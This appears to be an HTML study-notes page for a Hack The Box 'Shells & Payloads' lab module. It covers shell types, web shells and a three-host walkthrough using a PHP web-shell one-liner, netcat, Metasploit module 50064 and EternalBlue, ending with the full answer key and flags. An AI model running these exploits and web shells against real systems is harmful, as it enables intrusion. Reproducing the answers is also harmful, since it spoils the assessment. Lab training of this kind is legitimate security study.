@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shells &amp; Payloads — Field Notes</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c10; --surface: #0f1318; --surface2: #151b24; --border: #1e2a38;
+    --accent: #00d4ff; --accent2: #ff6b35; --accent3: #39ff14; --accent4: #c97bff;
+    --text: #c8d8e8; --text-dim: #5a7a96; --text-bright: #e8f4ff;
+    --mono: 'Share Tech Mono', monospace; --head: 'Rajdhani', sans-serif; --body: 'Inter', sans-serif;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: var(--body); font-size: 14px; line-height: 1.7; }
+  body::before { content: ''; position: fixed; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,212,255,0.01) 2px, rgba(0,212,255,0.01) 4px); pointer-events: none; z-index: 9999; }
+
+  .topbar { border-bottom: 1px solid var(--border); padding: 12px 32px; display: flex; align-items: center; gap: 16px; background: var(--surface); position: sticky; top: 0; z-index: 200; }
+  .topbar-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent3); box-shadow: 0 0 8px var(--accent3); animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  .topbar-title { font-family: var(--mono); font-size: 12px; color: var(--accent); letter-spacing: 2px; text-transform: uppercase; }
+  .topbar-right { margin-left: auto; font-family: var(--mono); font-size: 11px; color: var(--text-dim); }
+  .topbar a { color: var(--text-dim); text-decoration: none; }
+  .topbar a:hover { color: var(--accent); }
+
+  .page { display: flex; }
+  .sidebar { width: 215px; flex-shrink: 0; background: var(--surface); border-right: 1px solid var(--border); height: calc(100vh - 49px); position: sticky; top: 49px; overflow-y: auto; padding: 20px 0; }
+  .sidebar::-webkit-scrollbar { width: 4px; } .sidebar::-webkit-scrollbar-thumb { background: var(--border); }
+  .nav-section { padding: 8px 16px 4px; font-family: var(--mono); font-size: 10px; color: var(--text-dim); letter-spacing: 2px; text-transform: uppercase; }
+  .nav-link { display: block; padding: 6px 20px; font-size: 12px; color: var(--text-dim); text-decoration: none; transition: color .15s, background .15s; border-left: 2px solid transparent; }
+  .nav-link:hover { color: var(--accent); background: rgba(0,212,255,0.05); border-left-color: var(--accent); }
+  .main { flex: 1; min-width: 0; padding: 40px 44px 80px; max-width: 940px; }
+
+  .hero { margin-bottom: 52px; padding-bottom: 30px; border-bottom: 1px solid var(--border); position: relative; }
+  .hero::after { content: ''; position: absolute; bottom: -1px; left: 0; width: 120px; height: 2px; background: var(--accent); box-shadow: 0 0 12px var(--accent); }
+  .hero-label { font-family: var(--mono); font-size: 11px; color: var(--accent2); letter-spacing: 3px; text-transform: uppercase; margin-bottom: 12px; }
+  .hero h1 { font-family: var(--head); font-size: clamp(30px, 4vw, 50px); font-weight: 700; color: var(--text-bright); line-height: 1.1; }
+  .hero h1 span { color: var(--accent); }
+  .hero-sub { margin-top: 14px; color: var(--text-dim); font-size: 13px; max-width: 600px; }
+
+  .section { margin-bottom: 64px; scroll-margin-top: 70px; }
+  .section-header { display: flex; align-items: center; gap: 14px; margin-bottom: 22px; }
+  .section-num { font-family: var(--mono); font-size: 11px; color: var(--accent); background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.2); padding: 2px 8px; border-radius: 3px; flex-shrink: 0; }
+  .section-title { font-family: var(--head); font-size: 22px; font-weight: 600; color: var(--text-bright); }
+  .section-line { flex: 1; height: 1px; background: var(--border); }
+  .sub-title { font-family: var(--head); font-size: 15px; font-weight: 600; color: var(--text-bright); margin: 24px 0 10px; display: flex; align-items: center; gap: 8px; }
+
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 18px 22px; margin-bottom: 14px; position: relative; transition: border-color .2s; }
+  .card:hover { border-color: rgba(0,212,255,0.3); }
+  .card::before { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px; background: var(--accent); border-radius: 6px 0 0 6px; opacity: 0; transition: opacity .2s; }
+  .card:hover::before { opacity: 1; }
+  .card-title { font-family: var(--head); font-size: 15px; font-weight: 600; color: var(--text-bright); margin-bottom: 8px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+
+  .tag { font-family: var(--mono); font-size: 10px; padding: 2px 6px; border-radius: 3px; letter-spacing: 1px; white-space: nowrap; }
+  .tag-win  { background: rgba(0,212,255,0.1);   color: var(--accent);  border: 1px solid rgba(0,212,255,0.2); }
+  .tag-linux{ background: rgba(57,255,20,0.1);   color: var(--accent3); border: 1px solid rgba(57,255,20,0.2); }
+  .tag-both { background: rgba(201,123,255,0.1); color: var(--accent4); border: 1px solid rgba(201,123,255,0.25); }
+  .tag-tip  { background: rgba(0,212,255,0.1);   color: var(--accent);  border: 1px solid rgba(0,212,255,0.2); }
+  .tag-danger{ background: rgba(255,107,53,0.1); color: var(--accent2); border: 1px solid rgba(255,107,53,0.2); }
+
+  .code-label { font-family: var(--mono); font-size: 10px; color: var(--text-dim); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 5px; }
+  .code-block { background: #060809; border: 1px solid var(--border); border-radius: 4px; padding: 13px 15px; font-family: var(--mono); font-size: 12px; color: var(--accent3); overflow-x: auto; margin: 8px 0; line-height: 1.65; white-space: pre; }
+  .code-block .prompt  { color: var(--accent2); user-select: none; }
+  .code-block .comment { color: var(--text-dim); }
+  .code-block .flag    { color: var(--accent); }
+  .code-block .ps      { color: var(--accent4); user-select: none; }
+  code { font-family: var(--mono); font-size: 12px; background: rgba(0,212,255,0.08); color: var(--accent); padding: 1px 5px; border-radius: 3px; }
+
+  .tbl-wrap { overflow-x: auto; margin: 8px 0 14px; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th { background: var(--surface2); color: var(--accent); font-family: var(--mono); font-size: 10px; letter-spacing: 1px; text-transform: uppercase; padding: 9px 13px; text-align: left; border-bottom: 1px solid var(--border); }
+  td { padding: 8px 13px; border-bottom: 1px solid rgba(30,42,56,0.6); color: var(--text); vertical-align: top; }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(0,212,255,0.03); }
+  td code { font-size: 11px; }
+  td strong { color: var(--text-bright); }
+
+  .answer-box { background: rgba(57,255,20,0.05); border: 1px solid rgba(57,255,20,0.2); border-radius: 4px; padding: 10px 14px; display: flex; align-items: flex-start; gap: 10px; margin: 8px 0; }
+  .answer-icon { color: var(--accent3); font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+  .answer-q { color: var(--text-dim); font-size: 12px; margin-bottom: 3px; }
+  .answer-a { color: var(--accent3); font-family: var(--mono); font-size: 13px; }
+
+  .alert { background: rgba(255,107,53,0.07); border: 1px solid rgba(255,107,53,0.25); border-radius: 5px; padding: 13px 17px; margin: 12px 0; font-size: 13px; }
+  .alert-title { color: var(--accent2); font-family: var(--head); font-weight: 600; font-size: 13px; margin-bottom: 6px; }
+  .alert-blue { background: rgba(0,212,255,0.05); border-color: rgba(0,212,255,0.2); }
+  .alert-blue .alert-title { color: var(--accent); }
+
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; }
+  @media(max-width:720px){ .grid-2,.grid-3{ grid-template-columns:1fr; } .sidebar{ display:none; } }
+
+  .os-pill { display: inline-flex; align-items: center; gap: 4px; padding: 1px 8px; border-radius: 10px; font-family: var(--mono); font-size: 10px; letter-spacing: 0.5px; margin-left: 4px; }
+  .os-win { background: rgba(0,212,255,0.1); color: var(--accent); border: 1px solid rgba(0,212,255,0.25); }
+  .os-nix { background: rgba(57,255,20,0.1); color: var(--accent3); border: 1px solid rgba(57,255,20,0.25); }
+  .os-any { background: rgba(201,123,255,0.08); color: var(--accent4); border: 1px solid rgba(201,123,255,0.2); }
+
+  p { margin-bottom: 10px; }
+  hr { border: none; border-top: 1px solid var(--border); margin: 28px 0; }
+  ::-webkit-scrollbar { width: 6px; height: 6px; } ::-webkit-scrollbar-track { background: var(--bg); } ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-dot"></div>
+  <div class="topbar-title">HTB // Shells &amp; Payloads Module</div>
+  <div class="topbar-right"><a href="index.html">← index</a> &nbsp;·&nbsp; leviathan@parrot ~ field notes</div>
+</div>
+
+<div class="page">
+
+<nav class="sidebar">
+  <div class="nav-section">Concepts</div>
+  <a class="nav-link" href="#shell-types">Shell Types</a>
+  <a class="nav-link" href="#payloads">Staged vs Stageless</a>
+  <a class="nav-link" href="#interactive">Interactive Upgrades</a>
+
+  <div class="nav-section" style="margin-top:10px;">Vectors</div>
+  <a class="nav-link" href="#windows">Infiltrating Windows</a>
+  <a class="nav-link" href="#linux">Infiltrating Linux</a>
+  <a class="nav-link" href="#webshells">Web Shells</a>
+
+  <div class="nav-section" style="margin-top:10px;">Skills Assessment</div>
+  <a class="nav-link" href="#env">Environment &amp; Pivot</a>
+  <a class="nav-link" href="#host1">Host-1 · Tomcat</a>
+  <a class="nav-link" href="#host2">Host-2 · Blog RCE</a>
+  <a class="nav-link" href="#host3">Host-3 · EternalBlue</a>
+  <a class="nav-link" href="#answers">All Answers</a>
+
+  <div class="nav-section" style="margin-top:10px;">Defense</div>
+  <a class="nav-link" href="#blue">Detection &amp; Prevention</a>
+</nav>
+
+<main class="main">
+
+  <div class="hero">
+    <div class="hero-label">Hack The Box Academy · Module 06</div>
+    <h1>Shells &amp; <span>Payloads</span></h1>
+    <div class="hero-sub">Gaining and upgrading shell access across Windows and Linux — bind vs reverse, staged vs stageless, web shells, and the three-host skills assessment pivot from a dual-homed foothold.</div>
+  </div>
+
+  <!-- ========== SHELL TYPES ========== -->
+  <section class="section" id="shell-types">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <span class="section-title">Shell Types</span>
+      <span class="section-line"></span>
+    </div>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">Reverse Shell <span class="tag tag-tip">most common</span></div>
+        <p>Target connects <em>back</em> to the attacker's listener. Best when the target can reach out but inbound is filtered. You start the listener first, then trigger the payload.</p>
+        <div class="code-label">Attacker listener</div>
+        <div class="code-block"><span class="prompt">$</span> nc -lvnp 443</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Bind Shell <span class="tag tag-danger">target-side listener</span></div>
+        <p>Target opens a port and waits; the attacker connects <em>in</em>. Useful when the target can't initiate outbound — or, as in this assessment, when picking a callback IP on a multi-homed pivot is awkward.</p>
+        <div class="code-label">Attacker connects in</div>
+        <div class="code-block"><span class="prompt">$</span> nc -nv 172.16.1.12 4444</div>
+      </div>
+    </div>
+
+    <div class="alert alert-blue">
+      <div class="alert-title">Direction = firewall strategy</div>
+      Reverse shells beat outbound-permissive firewalls; bind shells beat inbound-permissive ones. Egress filtering on common ports (80/443) is the usual reason a reverse shell on 4444 silently fails.
+    </div>
+  </section>
+
+  <!-- ========== PAYLOADS ========== -->
+  <section class="section" id="payloads">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <span class="section-title">Staged vs Stageless</span>
+      <span class="section-line"></span>
+    </div>
+    <div class="tbl-wrap">
+      <table>
+        <tr><th>Type</th><th>How it works</th><th>Trade-off</th><th>msfvenom syntax</th></tr>
+        <tr><td><strong>Staged</strong></td><td>Small stager lands first, then pulls the larger payload (stage) over the network.</td><td>Tiny footprint; needs a working callback to fetch the stage.</td><td><code>windows/x64/meterpreter/reverse_tcp</code></td></tr>
+        <tr><td><strong>Stageless</strong></td><td>Entire payload is self-contained in one artifact.</td><td>Bigger/noisier file, but no second connection required — more reliable over flaky links.</td><td><code>windows/x64/meterpreter_reverse_tcp</code></td></tr>
+      </table>
+    </div>
+    <p>The <code>/</code> vs <code>_</code> between <code>meterpreter</code> and <code>reverse_tcp</code> is the only visible difference, and it changes behavior entirely.</p>
+  </section>
+
+  <!-- ========== INTERACTIVE ========== -->
+  <section class="section" id="interactive">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <span class="section-title">Interactive Shell Upgrades</span>
+      <span class="section-line"></span>
+    </div>
+    <p>Landed in a limited / jail shell? Spawn a real TTY using whatever interpreter is installed <span class="os-pill os-nix">linux</span></p>
+    <div class="code-block"><span class="comment"># classic — python TTY</span>
+python3 -c <span class="flag">'import pty; pty.spawn("/bin/bash")'</span>
+
+<span class="comment"># no python? fall through to whatever exists</span>
+/bin/sh -i
+perl -e <span class="flag">'exec "/bin/sh";'</span>
+awk <span class="flag">'BEGIN {system("/bin/sh")}'</span>
+find . -exec /bin/sh \; -quit
+vim -c <span class="flag">':!/bin/sh'</span>
+
+<span class="comment"># once stable, check leverage</span>
+sudo -l
+ls -la /path/to/binary</div>
+    <div class="alert">
+      <div class="alert-title">Then stabilize</div>
+      After spawning bash: <code>Ctrl-Z</code> → <code>stty raw -echo; fg</code> → <code>export TERM=xterm</code> for arrow keys, tab-completion, and a working <code>sudo -l</code>.
+    </div>
+  </section>
+
+  <!-- ========== WINDOWS ========== -->
+  <section class="section" id="windows">
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <span class="section-title">Infiltrating Windows</span>
+      <span class="section-line"></span>
+    </div>
+    <div class="card">
+      <div class="card-title">Common Windows vectors <span class="tag tag-win">windows</span></div>
+      <p>MS17-010 (EternalBlue) SMBv1 pool corruption, vulnerable service exploitation via Metasploit, and payload delivery + remote execution. The <code>ms17_010_command</code> aux module can read files without a full session by abusing the write-what-where primitive.</p>
+    </div>
+  </section>
+
+  <!-- ========== LINUX ========== -->
+  <section class="section" id="linux">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <span class="section-title">Infiltrating Linux</span>
+      <span class="section-line"></span>
+    </div>
+    <div class="card">
+      <div class="card-title">Common Linux vectors <span class="tag tag-linux">linux</span></div>
+      <p>Vulnerable web apps / CMS plugins, misconfigured services, and known-CVE exploitation. Web-app footholds often drop a scripting-language web shell (PHP/JSP) that you then upgrade to an interactive TTY.</p>
+    </div>
+  </section>
+
+  <!-- ========== WEB SHELLS ========== -->
+  <section class="section" id="webshells">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <span class="section-title">Web Shells</span>
+      <span class="section-line"></span>
+    </div>
+    <div class="grid-3">
+      <div class="card"><div class="card-title">Laudanum</div><p>Pre-built shells in many languages. <strong>Edit the <code>allowedIps[]</code> allowlist</strong> to your source IP or it returns access-denied.</p></div>
+      <div class="card"><div class="card-title">Antak (.aspx)</div><p>PowerShell-based ASPX web shell from Nishang — for IIS / .NET targets.</p></div>
+      <div class="card"><div class="card-title">PHP one-liners</div><p><code>&lt;?php system($_GET['c']); ?&gt;</code> — minimal, useful when an upload filter is weak.</p></div>
+    </div>
+    <div class="alert">
+      <div class="alert-title">Laudanum allowlist gotcha</div>
+      Both the JSP and ASPX templates ship with a hardcoded IP allowlist. On a pivot, that must be the foothold's <em>internal</em> interface IP — the address the target actually sees the request coming from — not your VPN address.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <!-- ===================  SKILLS ASSESSMENT  ==================== -->
+  <!-- ============================================================ -->
+
+  <section class="section" id="env">
+    <div class="section-header">
+      <span class="section-num">SA</span>
+      <span class="section-title">Skills Assessment — Environment</span>
+      <span class="section-line"></span>
+    </div>
+    <p>Three internal Inlanefreight hosts, reachable only through a dual-homed Windows foothold. Connect via RDP and work entirely from inside.</p>
+    <div class="tbl-wrap">
+      <table>
+        <tr><th>Host</th><th>Address</th><th>OS</th><th>Vector</th></tr>
+        <tr><td><strong>Foothold</strong></td><td><code>10.129.204.126</code> (VPN)<br><code>172.16.1.5/23</code> (internal)</td><td>Windows</td><td>RDP entry · pivot</td></tr>
+        <tr><td><strong>Host-1</strong></td><td><code>172.16.1.11:8080</code></td><td>Win Server 2019</td><td>Tomcat WAR + IIS upload</td></tr>
+        <tr><td><strong>Host-2</strong></td><td><code>172.16.1.12</code> · blog.inlanefreight.local</td><td>Ubuntu</td><td>Blog plugin RCE (php)</td></tr>
+        <tr><td><strong>Host-3</strong></td><td><code>172.16.1.13</code></td><td>Win Server 2016</td><td>MS17-010 EternalBlue</td></tr>
+      </table>
+    </div>
+
+    <div class="alert">
+      <div class="alert-title">⚠ The dual-homed listener trap</div>
+      Internal targets can only reach the foothold's <code>172.16.1.5</code> interface. Every <strong>LHOST / allowed-IP / callback</strong> must be that internal IP — never the <code>10.129.x.x</code> VPN address, or reverse shells just time out.
+    </div>
+
+    <div class="code-label">Connect &amp; confirm interface</div>
+    <div class="code-block"><span class="prompt">leviathan@parrot$</span> xfreerdp /v:10.129.204.126 /u:htb-student /p:'HTB_@cademy_stdnt!' \
+            /drive:share,/usr/share/laudanum +clipboard
+
+<span class="prompt">htb-student@skills-foothold$</span> ip a
+   inet <span class="flag">172.16.1.5/23</span>  <span class="comment"># &lt;-- use THIS for all callbacks</span></div>
+  </section>
+
+  <!-- HOST 1 -->
+  <section class="section" id="host1">
+    <div class="section-header">
+      <span class="section-num">H1</span>
+      <span class="section-title">Host-1 · Tomcat Upload</span>
+      <span class="section-line"></span>
+    </div>
+
+    <div class="answer-box">
+      <span class="answer-icon">▶</span>
+      <div><div class="answer-q">Q1 — Hostname of Host-1 (lower case)</div><div class="answer-a">shells-winsvr</div></div>
+    </div>
+    <div class="answer-box">
+      <span class="answer-icon">▶</span>
+      <div><div class="answer-q">Q2 — Folder in C:\Shares\ (lower case)</div><div class="answer-a">dev-share</div></div>
+    </div>
+
+    <div class="sub-title">Enumerate <span class="os-pill os-win">win 2019</span></div>
+    <div class="code-block"><span class="prompt">$</span> nmap 172.16.1.11 -sC -sV
+80/tcp   open  http          Microsoft IIS httpd 10.0
+445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+8080/tcp open  http          <span class="flag">Apache Tomcat 10.0.11</span>
+| rdp-ntlm-info:  Target_Name: <span class="flag">SHELLS-WINSVR</span>
+| smb-os-discovery: Computer name: <span class="flag">shells-winsvr</span></div>
+
+    <div class="sub-title">Vector — Tomcat Manager WAR deploy</div>
+    <p>Two upload paths exist. Cleanest is the Tomcat Manager app: auth with <code>tomcat : Tomcatadm</code>, deploy a WAR built from the Laudanum JSP shell, then browse to the deployed context for command execution.</p>
+    <div class="code-block"><span class="prompt">$</span> cd /usr/share/laudanum/jsp
+<span class="prompt">$</span> sudo ./makewar.sh
+  adding: warfiles/cmd.jsp ...
+<span class="prompt">$</span> ls
+  <span class="flag">cmd.war</span>  makewar.sh  warfiles
+
+<span class="comment"># deploy cmd.war via /manager/html, then through the web shell:</span>
+C:\&gt; dir C:\Shares\
+  &lt;DIR&gt;   <span class="flag">dev-share</span></div>
+
+    <div class="alert alert-blue">
+      <div class="alert-title">Second vector</div>
+      The IIS status site on port 80 (<code>status.inlanefreight.local</code>) accepts a Laudanum <strong>.aspx</strong> shell — same idea, different stack. Add the foothold's internal IP to <code>allowedIps[]</code> first.
+    </div>
+  </section>
+
+  <!-- HOST 2 -->
+  <section class="section" id="host2">
+    <div class="section-header">
+      <span class="section-num">H2</span>
+      <span class="section-title">Host-2 · Blog Plugin RCE</span>
+      <span class="section-line"></span>
+    </div>
+
+    <div class="answer-box">
+      <span class="answer-icon">▶</span>
+      <div><div class="answer-q">Q3 — Linux distribution (lower case)</div><div class="answer-a">ubuntu</div></div>
+    </div>
+    <div class="answer-box">
+      <span class="answer-icon">▶</span>
+      <div><div class="answer-q">Q4 — Shell language uploaded by 50064.rb</div><div class="answer-a">php</div></div>
+    </div>
+    <div class="answer-box">
+      <span class="answer-icon">▶</span>
+      <div><div class="answer-q">Q5 — Contents of /customscripts/flag.txt</div><div class="answer-a">B1nD_Shells_r_cool</div></div>
+    </div>
+
+    <div class="sub-title">Enumerate <span class="os-pill os-nix">ubuntu</span></div>
+    <div class="code-block"><span class="prompt">$</span> nmap -sC -sV 172.16.1.12
+22/tcp open  ssh   OpenSSH 8.2p1 <span class="flag">Ubuntu</span> 4ubuntu0.3 (<span class="flag">Ubuntu Linux</span>)
+80/tcp open  http  Apache httpd 2.4.41 ((<span class="flag">Ubuntu</span>))
+|_http-title: Inlanefreight Gabber</div>
+
+    <div class="sub-title">Exploit — Metasploit 50064 (PHP bind payload)</div>
+    <div class="code-block"><span class="prompt">msf6 exploit(50064)&gt;</span> options
+Payload options (<span class="flag">php/meterpreter/bind_tcp</span>):  <span class="comment"># &lt;-- shell is PHP</span>
+
+<span class="prompt">msf6 exploit(50064)&gt;</span> set rhost 172.16.1.12
+<span class="prompt">msf6 exploit(50064)&gt;</span> set username admin
+<span class="prompt">msf6 exploit(50064)&gt;</span> set password admin123!@#
+<span class="prompt">msf6 exploit(50064)&gt;</span> set vhost blog.inlanefreight.local
+<span class="prompt">msf6 exploit(50064)&gt;</span> run
+
+<span class="prompt">meterpreter&gt;</span> shell
+<span class="prompt">$</span> cat /customscripts/flag.txt
+<span class="flag">B1nD_Shells_r_cool</span></div>
+
+    <div class="alert alert-blue">
+      <div class="alert-title">Why bind, not reverse?</div>
+      This module uses a <strong>bind</strong> payload — the foothold dials the target instead of waiting for a callback, neatly sidestepping the multi-homed callback-IP problem. The flag name is a wink at exactly that.
+    </div>
+  </section>
+
+  <!-- HOST 3 -->
+  <section class="section" id="host3">
+    <div class="section-header">
+      <span class="section-num">H3</span>
+      <span class="section-title">Host-3 · EternalBlue</span>
+      <span class="section-line"></span>
+    </div>
+
+    <div class="answer-box">
+      <span class="answer-icon">▶</span>
+      <div><div class="answer-q">Q6 — Hostname of Host-3</div><div class="answer-a">SHELLS-WINBLUE</div></div>
+    </div>
+    <div class="answer-box">
+      <span class="answer-icon">▶</span>
+      <div><div class="answer-q">Bonus — Administrator desktop flag</div><div class="answer-a">One-H0st-Down!</div></div>
+    </div>
+
+    <p>Win Server 2016, SMB exposed, <code>message_signing: disabled</code> — the "made sysadmins feel Blue" hint points straight at <strong>MS17-010 / EternalBlue</strong>. Hostname comes from the SMB/NetBIOS discovery scripts.</p>
+    <div class="code-block"><span class="prompt">$</span> nmap -sC -sV -p 80,135,139,445 172.16.1.13
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393
+|_nbstat: NetBIOS name: <span class="flag">SHELLS-WINBLUE</span>
+
+<span class="prompt">msf6 auxiliary(ms17_010_command)&gt;</span> set rhost 172.16.1.13
+<span class="prompt">msf6 auxiliary(ms17_010_command)&gt;</span> set command type "C:\Users\Administrator\Desktop\Skills-flag.txt"
+<span class="prompt">msf6 auxiliary(ms17_010_command)&gt;</span> run
+[+] Built a write-what-where primitive...
+[+] <span class="flag">Overwrite complete... SYSTEM session obtained!</span>
+[*] Output:  <span class="flag">One-H0st-Down!</span></div>
+  </section>
+
+  <!-- ANSWERS SUMMARY -->
+  <section class="section" id="answers">
+    <div class="section-header">
+      <span class="section-num">★</span>
+      <span class="section-title">All Answers</span>
+      <span class="section-line"></span>
+    </div>
+    <div class="tbl-wrap">
+      <table>
+        <tr><th>#</th><th>Question</th><th>Answer</th></tr>
+        <tr><td>1</td><td>Host-1 hostname</td><td><code>shells-winsvr</code></td></tr>
+        <tr><td>2</td><td>Folder in C:\Shares\</td><td><code>dev-share</code></td></tr>
+        <tr><td>3</td><td>Host-2 Linux distro</td><td><code>ubuntu</code></td></tr>
+        <tr><td>4</td><td>50064.rb shell language</td><td><code>php</code></td></tr>
+        <tr><td>5</td><td>/customscripts/flag.txt</td><td><code>B1nD_Shells_r_cool</code></td></tr>
+        <tr><td>6</td><td>Host-3 hostname</td><td><code>SHELLS-WINBLUE</code></td></tr>
+        <tr><td>+</td><td>Host-3 Administrator flag</td><td><code>One-H0st-Down!</code></td></tr>
+      </table>
+    </div>
+  </section>
+
+  <!-- BLUE TEAM -->
+  <section class="section" id="blue">
+    <div class="section-header">
+      <span class="section-num">07</span>
+      <span class="section-title">Detection &amp; Prevention</span>
+      <span class="section-line"></span>
+    </div>
+    <div class="grid-2">
+      <div class="card"><div class="card-title">File uploads</div><p>Watch web-app logs for unexpected <code>.war</code>/<code>.aspx</code>/<code>.php</code> writes. Sandbox internet-facing apps; run AV on the web server itself.</p></div>
+      <div class="card"><div class="card-title">Anomalous sessions</div><p>A heartbeat on port <code>4444</code> (Meterpreter default) in NetFlow is a classic IOC. Bind shells flip direction but still create host-to-host traffic that shouldn't exist.</p></div>
+      <div class="card"><div class="card-title">Suspicious commands</div><p>Normal users rarely run <code>whoami</code> or <code>net user</code>. Command-line + PowerShell logging surfaces it fast.</p></div>
+      <div class="card"><div class="card-title">MS17-010</div><p>Patch and disable SMBv1. Host hardening + segmentation stop lateral movement from a boundary host.</p></div>
+    </div>
+    <div class="alert alert-blue">
+      <div class="alert-title">MITRE mapping</div>
+      Initial Access (public-facing app) → Execution (uploaded payload) → Command &amp; Control (established session). Baseline the network so deviations are loud.
+    </div>
+  </section>
+
+</main>
+</div>
+
+</body>
+</html>
